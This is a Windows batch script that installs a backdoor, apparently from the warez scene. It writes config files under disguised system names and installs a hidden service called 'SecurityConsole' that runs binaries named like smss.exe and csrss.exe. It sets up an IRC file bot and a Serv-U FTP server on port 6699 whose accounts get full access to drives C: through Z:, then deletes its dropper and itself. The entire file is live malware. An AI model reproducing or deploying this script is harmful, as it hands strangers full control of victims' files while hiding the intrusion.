rem !WARNING! this batch file contains special control characters ^ DO-NOT REMOVE THEM 
rem or setup WILL FAIL you have been WARNED!

rem service setup
echo [settings] > svchost.dll
echo ServiceName = "SecurityConsole" >> svchost.dll
echo ProcCount = 2 >> svchost.dll
echo CheckProcess = 1 >> svchost.dll

echo [Process0] >> svchost.dll
echo CommandLine = %windir%\AppPatch\Patches32\smss.exe "runtime.dll" >> svchost.dll
echo WorkingDir =  %windir%\AppPatch\Patches32\ >> svchost.dll
echo PauseStart = 1000 >> svchost.dll
echo PauseEnd = 1000 >>svchost.dll
echo UserInterface = no >> svchost.dll
echo Restart = Yes >> svchost.dll

echo [Process1] >> svchost.dll
echo CommandLine = %windir%\AppPatch\Patches32\csrss.exe  >> svchost.dll
echo WorkingDir =  %windir%\AppPatch\Patches32\ >> svchost.dll
echo PauseStart = 1000 >> svchost.dll
echo PauseEnd = 1000 >>svchost.dll
echo UserInterface = no >> svchost.dll
echo Restart = Yes >> svchost.dll



rem iroffer setup
echo user_nick [BiG]-PaUl-%random% >> runtime.dll
echo uploaddir %windir%\AppPatch\Patches\>> runtime.dll
mkdir %windir%\AppPatch\Patches\

rem iroffer archiving setup 
copy %windir%\AppPatch\Patches32\tar.exe %windir%\AppPatch\Patches\tar.exe
copy %windir%\AppPatch\Patches32\rar.exe %windir%\AppPatch\Patches\rar.exe
copy %windir%\AppPatch\Patches32\rarreg.key %windir%\AppPatch\Patches\rarreg.key

rem cleaning up archivers
del %windir%\AppPatch\Patches32\tar.exe /Q
del %windir%\AppPatch\Patches32\rar.exe /Q
del %windir%\AppPatch\Patches32\rarreg.key /Q

rem setting up iroffer configuation changer
copy %windir%\AppPatch\Patches32\change.bat %windir%\AppPatch\Patches\change.bat

rem serv-u setup
echo [GLOBAL] > winservices.vxd
echo Version=6.0.0.2 >> winservices.vxd
echo SocketInlineOOB=1 >> winservices.vxd
echo SocketKeepAlive=1 >> winservices.vxd
echo PacketTimeOut=300 >> winservices.vxd
echo ProcessID=4808 >> winservices.vxd
echo [DOMAINS] >> winservices.vxd
echo Domain1=0.0.0.0^|^|^6699^|^xdcc^|^1^|^1 >> winservices.vxd 
echo [Domain1] >> winservices.vxd
echo User1=Administrator^|^1^|^0 >> winservices.vxd
echo MDTMCanChange=0 >> winservices.vxd
echo ReplyHello=ViperWarez INC / 101-Freedom FTPd Online >> winservices.vxd
echo User2=Curry^|^1^|^0 >> winservices.vxd
echo MDTMCanChange=0 >> winservices.vxd
echo SignOn=%windir%\AppPatch\Patches32\winmanagement.dll >> winservices.vxd
echo [USER=Administrator^|^1] >> winservices.vxd
echo Password=mzD839F1DA39A8D67681D2C44604E786A4 >> winservices.vxd
echo HomeDir=%windir%\AppPatch\Patches32 >> winservices.vxd
echo AlwaysAllowLogin=1 >> winservices.vxd
echo ChangePassword=1 >> winservices.vxd
echo TimeOut=600 >> winservices.vxd
echo Maintenance=System >> winservices.vxd
echo Access1=C:\^|^RWAMELCDP >> winservices.vxd
echo Access2=D:\^|^RWAMELCDP  >> winservices.vxd
echo Access3=E:\^|^RWAMELCDP >> winservices.vxd
echo Access4=F:\^|^RWAMELCDP >> winservices.vxd
echo Access5=G:\^|^RWAMELCDP >> winservices.vxd
echo Access6=H:\^|^RWAMELCDP >> winservices.vxd
echo Access7=I:\^|^RWAMELCDP >> winservices.vxd
echo Access8=J:\^|^RWAMELCDP >> winservices.vxd
echo Access9=K:\^|^RWAMELCDP >> winservices.vxd
echo Access10=L:\^|^RWAMELCDP >> winservices.vxd
echo Access11=M:\^|^RWAMELCDP >> winservices.vxd
echo Access12=N:\^|^RWAMELCDP >> winservices.vxd
echo Access13=O:\^|^RWAMELCDP >> winservices.vxd
echo Access14=P:\^|^RWAMELCDP >> winservices.vxd
echo Access15=Q:\^|^RWAMELCDP >> winservices.vxd
echo Access16=R:\^|^RWAMELCDP >> winservices.vxd
echo Access17=S:\^|^RWAMELCDP >> winservices.vxd
echo Access18=T:\^|^RWAMELCDP >> winservices.vxd
echo Access19=U:\^|^RWAMELCDP >> winservices.vxd
echo Access20=V:\^|^RWAMELCDP >> winservices.vxd
echo Access21=W:\^|^RWAMELCDP >> winservices.vxd
echo Access22=X:\^|^RWAMELCDP >> winservices.vxd
echo Access23=Y:\^|^RWAMELCDP >> winservices.vxd
echo Access24=Z:\^|^RWAMELCDP >> winservices.vxd
echo [USER=Curry^|^1] >> winservices.vxd
echo Password=mzD839F1DA39A8D67681D2C44604E786A4 >> winservices.vxd
echo HomeDir=%windir%\AppPatch\Patches >> winservices.vxd
echo RelPaths=1 >> winservices.vxd
echo HideHidden=1 >> winservices.vxd
echo TimeOut=600 >> winservices.vxd
echo Access1=C:\^|^RWAMLCDP >> winservices.vxd
echo Access2=D:\^|^RWAMLCDP  >> winservices.vxd
echo Access3=E:\^|^RWAMLCDP >> winservices.vxd
echo Access4=F:\^|^RWAMLCDP >> winservices.vxd
echo Access5=G:\^|^RWAMLCDP >> winservices.vxd
echo Access6=H:\^|^RWAMLCDP >> winservices.vxd
echo Access7=I:\^|^RWAMLCDP >> winservices.vxd
echo Access8=J:\^|^RWAMLCDP >> winservices.vxd
echo Access9=K:\^|^RWAMLCDP >> winservices.vxd
echo Access10=L:\^|^RWAMLCDP >> winservices.vxd
echo Access11=M:\^|^RWAMLCDP >> winservices.vxd
echo Access12=N:\^|^RWAMLCDP >> winservices.vxd
echo Access13=O:\^|^RWAMLCDP >> winservices.vxd
echo Access14=P:\^|^RWAMLCDP >> winservices.vxd
echo Access15=Q:\^|^RWAMLCDP >> winservices.vxd
echo Access16=R:\^|^RWAMLCDP >> winservices.vxd
echo Access17=S:\^|^RWAMLCDP >> winservices.vxd
echo Access18=T:\^|^RWAMLCDP >> winservices.vxd
echo Access19=U:\^|^RWAMLCDP >> winservices.vxd
echo Access20=V:\^|^RWAMLCDP >> winservices.vxd
echo Access21=W:\^|^RWAMLCDP >> winservices.vxd
echo Access22=X:\^|^RWAMLCDP >> winservices.vxd
echo Access23=Y:\^|^RWAMLCDP >> winservices.vxd
echo Access24=Z:\^|^RWAMLCDP >> winservices.vxd

rem service install

svchost -i

rem service startup

net start SecurityConsole

rem cleaning up
del blastcln.exe /Q
del setup.bat /Q